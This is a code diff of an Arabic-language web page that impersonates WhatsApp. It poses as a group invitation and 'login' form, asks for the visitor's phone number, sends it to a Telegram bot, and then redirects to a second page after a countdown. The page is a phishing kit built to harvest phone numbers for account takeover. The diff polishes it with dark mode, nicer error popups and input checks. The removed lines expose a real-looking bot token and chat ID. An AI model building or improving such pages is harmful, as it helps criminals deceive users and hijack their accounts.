@@ -3,21 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:image" content="https://your-image-link.jpg"> <!-- رابط الصورة الخاصة بك هنا -->
+    <meta property="og:image" content="https://your-image-link.jpg">
     <meta property="og:title" content="الدعوة للانضمام إلى مجموعة واتساب">
     <meta property="og:description" content="الدعوة للانضمام إلى مجموعة واتساب. اضغط على الرابط للانضمام.">
-    <meta property="og:url" content="https://your-link-to-group.com"> <!-- رابط الدعوة إلى المجموعة هنا -->
+    <meta property="og:url" content="https://your-link-to-group.com">
     <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <title>الدعوة للانضمام إلى مجموعة واتساب</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Tajawal', sans-serif;
             background-color: #FAF3E7;
             margin: 0;
             padding: 0;
+            transition: background-color 0.3s, color 0.3s;
         }
 
-       .navbar {
+        body.dark-mode {
+            background-color: #333;
+            color: #fff;
+        }
+
+        .navbar {
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -25,16 +33,6 @@
             padding: 10px 20px;
             color: white;
             font-size: 18px;
-        }
-
-        .navbar .logo {
-            display: flex;
-            align-items: center;
-        }
-
-        .navbar .logo img {
-            height: 30px;
-            margin-right: 10px;
         }
 
         .container {
@@ -45,6 +43,12 @@
             padding: 20px;
             max-width: 400px;
             margin: 50px auto;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .container.dark-mode {
+            background-color: #444;
+            color: #ddd;
         }
 
         .container img {
@@ -52,28 +56,14 @@
             margin-bottom: 20px;
         }
 
-        .container .title {
-            font-size: 22px;
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 15px;
-        }
-
-        .container .description {
-            font-size: 14px;
-            color: #555;
-            margin-bottom: 20px;
-        }
-
-        .container .form-group {
+        .form-group {
             display: flex;
             flex-direction: column;
             gap: 10px;
             align-items: center;
         }
 
-        .container select,
-        .container input {
+        select, input, button {
             border: 1px solid #ddd;
             border-radius: 6px;
             padding: 10px;
@@ -82,26 +72,15 @@
             max-width: 300px;
         }
 
-        .container button {
-            padding: 10px;
+        button {
             background-color: #25D366;
             color: white;
-            border: none;
-            border-radius: 6px;
             font-size: 16px;
             cursor: pointer;
-            width: 100%;
-            max-width: 300px;
         }
 
-        .container button:hover {
+        button:hover {
             background-color: #1DA955;
-        }
-
-        .countdown {
-            font-size: 16px;
-            color: #25D366;
-            margin-top: 20px;
         }
 
         footer {
@@ -110,23 +89,30 @@
             color: #888;
             font-size: 12px;
         }
+
+        @media screen and (max-width: 600px) {
+            .container {
+                width: 90%;
+                padding: 10px;
+            }
+
+            .navbar {
+                font-size: 14px;
+            }
+        }
     </style>
 </head>
 
 <body>
-    <!-- Navbar -->
     <div class="navbar">
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
-            WhatsApp 
-        </div>
+        <div>WhatsApp</div>
+        <button onclick="toggleDarkMode()">الوضع الليلي</button>
     </div>
 
-    <!-- Main Container -->
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
-        <div class="title">تسجيل الدخول</div>
-        <div class="description">الدعوة للانضمام إلى مجموعة واتساب.</div>
+        <div>تسجيل الدخول</div>
+        <div>الدعوة للانضمام إلى مجموعة واتساب.</div>
 
         <div class="form-group">
             <select id="countryCode">
@@ -145,46 +131,48 @@
             <input id="phoneNumber" type="tel" placeholder="رقم الهاتف" maxlength="14">
         </div>
         <button onclick="sendMessage()">متابعة</button>
-        <div class="countdown" id="countdown"></div>
+        <div id="loader" style="display: none;">جاري الإرسال...</div>
+        <div id="countdown"></div>
     </div>
 
-    <footer>
-        ©️ 2024 واتساب
-    </footer>
+    <footer>©️ 2024 واتساب</footer>
 
     <script>
-        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
-        const chatId = '612575358';
+        function toggleDarkMode() {
+            document.body.classList.toggle('dark-mode');
+            document.querySelector('.container').classList.toggle('dark-mode');
+        }
 
         function sendMessage() {
             const countryCode = document.getElementById('countryCode').value;
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
 
-            if (!phoneNumber || phoneNumber.length < 6) {
-                alert('يرجى إدخال رقم هاتف صحيح.');
+            const phoneRegex = /^[0-9]{6,14}$/;
+            if (!phoneRegex.test(phoneNumber)) {
+                Swal.fire({ icon: 'error', title: 'خطأ', text: 'يرجى إدخال رقم هاتف صالح.' });
                 return;
             }
 
             const fullPhoneNumber = `+${countryCode} ${phoneNumber}`;
+            document.getElementById('loader').style.display = 'block';
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: `رقم الهاتف: ${fullPhoneNumber}`
-                })
+                body: JSON.stringify({ chat_id: 'YOUR_CHAT_ID', text: `رقم الهاتف: ${fullPhoneNumber}` })
             })
             .then(response => response.json())
             .then(data => {
+                document.getElementById('loader').style.display = 'none';
                 if (data.ok) {
                     startCountdown();
                 } else {
-                    alert('حدث خطأ أثناء الإرسال.');
+                    Swal.fire({ icon: 'error', title: 'خطأ', text: 'حدث خطأ أثناء الإرسال.' });
                 }
             })
-            .catch(error => {
-                alert('فشل الاتصال بالخادم. حاول مرة أخرى.');
+            .catch(() => {
+                document.getElementById('loader').style.display = 'none';
+                Swal.fire({ icon: 'error', title: 'خطأ', text: 'فشل الاتصال بالخادم.' });
             });
         }
 
@@ -198,7 +186,7 @@
 
                 if (countdown < 0) {
                     clearInterval(interval);
-                    window.location.href = 'secondpage.html'; // قم بتغيير الرابط للصفحة المطلوبة
+                    window.location.href = 'secondpage.html';
                 }
             }, 1000);
         }
